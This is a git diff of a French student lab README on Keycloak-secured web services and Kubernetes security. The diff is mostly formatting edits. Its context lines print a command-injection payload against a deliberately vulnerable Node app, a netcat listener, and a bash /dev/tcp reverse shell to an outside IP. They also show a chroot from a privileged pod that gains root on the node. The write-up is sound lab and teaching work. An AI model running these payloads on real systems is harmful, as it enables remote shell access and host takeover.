@@ -1,6 +1,7 @@
 # TP - Web Services Sécurisés avec Keycloak
+
 > Luca CECCARELLI
-> Celian CHAUSSON
+> Célian CHAUSSON
 > Lenny GONZALES
 
 Architecture microservices à trois tiers : frontend statique, API REST Spring Boot, et serveur d'autorisation Keycloak.
@@ -332,7 +333,6 @@ kubectl delete -f k8s/
 sudo /usr/local/bin/k3s-uninstall.sh
 ```
 
-
 ## Sécurité Kubernetes (k3s)
 
 ## Étape 1 : Déploiement de l'application vulnérable
@@ -344,9 +344,11 @@ sudo /usr/local/bin/k3s-uninstall.sh
 - Ajout de `vulnnode.infres.fr` dans `/etc/hosts`
 
 Ainsi,
+
 ```bash
 curl -X POST http://vulnnode.infres.fr/post.html -d "lookup=google.com"
 ```
+
 résout correctement le DNS.
 
 ## Étape 2 : Exploitation de l'injection de commandes
@@ -354,18 +356,22 @@ résout correctement le DNS.
 La vulnérabilité se situe à la ligne 16 du fichier `server.js` : `exec("nslookup " + host, ...)` sans vérification de la variable d'entrée `host`.
 
 À partir de cela, nous pouvons mettre un `;` pour exécuter d'autres commandes :
+
 ```bash
 curl -X POST http://vulnnode.infres.fr/post.html --data-urlencode "lookup=google.com; id"
 ```
+
 `uid=1000(node) gid=1000(node)`
 
 Ainsi, nous pouvons faire un reverse shell.
 Sur notre machine (attaquant) :
+
 ```bash
 nc -lvnp 9001
 ```
 
 Payload :
+
 ```bash
 curl -X POST http://vulnnode.infres.fr/post.html --data-urlencode "lookup=google.com; bash -c 'sh -i >& /dev/tcp/159.31.66.203/9001 0>&1'"
 ```
@@ -431,6 +437,7 @@ Pour prévenir cela, nous pouvons utiliser Pod Security Standards (restricted) p
 ```bash
 kubectl exec -n infres priv-pod -- chroot /host /bin/sh -c "id && hostname"
 ```
+
 `uid=0(root) gid=0(root)`, `hostname=pc-luca`
 
 Grâce à cela, nous avons un accès root sur le nœud.
